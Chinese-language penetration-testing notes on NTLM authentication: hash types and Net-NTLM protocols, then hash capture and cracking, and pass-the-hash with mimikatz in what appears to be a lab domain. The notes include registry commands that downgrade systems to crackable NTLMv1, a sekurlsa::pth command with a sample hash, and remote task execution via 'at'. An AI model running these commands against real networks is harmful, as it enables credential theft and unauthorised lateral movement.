# **原理**

## 一、Net-NTLM协议

[http://d1iv3.me/2018/12/08/LM-Hash%E3%80%81NTLM-Hash%E3%80%81Net-NTLMv1%E3%80%81Net-NTLMv2%E8%AF%A6%E8%A7%A3/](http://d1iv3.me/2018/12/08/LM-Hash、NTLM-Hash、Net-NTLMv1、Net-NTLMv2详解/)

## 1. LM Hash与NT Hash

LM Hash与NT Hash，密码根据固定算法转成的两种Hash，LM Hash更容易被破解

NTLM Hash = LM Hash + NT Hash，也有的会把NTLM Hash等同于NT Hash

## 2. Lan Manager认证 与 NT Lan Manager

其中NT Lan Manager有两个版本：Net-NTLMv1，Net-NTLMv2。这三个都属于认证协议，都是基于challenge/reponse的，但是用的Client Hash及对challenge加密方法不同。

在NT Lan Manager中，客户端最后给服务器的响应，称为**Net-NTLMv1 Hash及Net-NTLMv2 Hash**。

Lan Manager: 使用LM Hash

Net-NTLMv1: 使用LM Hash和NT Hash

Net-NTLMv2: 使用NT Hash

![img](assets/clipboard.png)

![img](assets/clipboard-1599139168229.png)

## 3. 挑战响应级别配置

![img](assets/clipboard-1599139194923.png)

 各个系统默认配置如下

```
Windows 2000 以及 Windows XP: 发送 LM & NTLM 响应

Windows Server 2003: 仅发送 NTLM 响应

Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2: 仅发送 NTLMv2 响应
```

# 利用

## 一、 Hash窃取与破解

### 1. hashcat

Hashcat支持超过200种高度优化的hash算法，其中和NTLM hash相关的有4个，分别为NetNTLMv1、NetNTLMv1+ESS、NetNTLMv2和NTLM。

破解NetNTLMv1：[https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/](https://3gstudent.github.io/3gstudent.github.io/Windows下的密码hash-Net-NTLMv1介绍/)

```
username::hostname:LM response:NTLM response:challenge
```

破解NetNTLMv2：[https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/](https://3gstudent.github.io/3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍/)

```
username::domain:challenge:HMAC-MD5:blob
```

![img](assets/clipboard-1599139397363.png)

### 2. Hash窃取与破解

[https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/](https://3gstudent.github.io/3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍/)

- 同一网络内嗅探
- 中间人攻击
- 伪造服务器诱使用户输入凭据，在服务端收取Net-NTLM Hash

https://github.com/lgandx/Responder

https://github.com/Kevin-Robertson/Inveigh  

感觉不是每次都能抓到...

![img](assets/clipboard-1599139437121.png)

- Net-NTLMv2 Hash暴力破解和字典破解难度比较高，如果有管理员权限，可将Lan Manager身份验证级别由Net-NTLMv2降为Net-NTLMv1

[https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/](https://3gstudent.github.io/3gstudent.github.io/Windows下的密码hash-Net-NTLMv1介绍/)

修改注册表：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f
```

实现工具：https://github.com/eladshamir/Internal-Monologue



## 二、Pass the Hash

需要攻击使用了NTLM认证的服务，如

- 文件共享功能-使用了SMB服务-采取了NTLM认证
- WMI功能
- RDP功能
- Winrm - 支持NTLM认证

这里用mimikatz做实验，python、powershell等其他工具pth的参考：[https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/](https://3gstudent.github.io/3gstudent.github.io/域渗透-Pass-The-Hash的实现/)

### 1. SMB服务

```
privilege::debug
sekurlsa::pth /user:win10 /domain:ring2.com /ntlm:443cb360ce0b1f9cea935880bf31158d /run:cmd.exe
```

![img](assets/clipboard-1599140584209.png)

创建定时任务来执行命令，at 命令或schtasks命令，启动的子进程是System权限，nice~

```
PS C:\Windows\system32> at \\192.168.240.128 4:37PM C:\Windows\System32\calc.exe
AT 命令已弃用。请改用 schtasks.exe。

新加了一项作业，其作业 ID = 3
```

![img](assets/36-367970866.png)

### 2. WMI

### 3. RDP

### 4. Winrm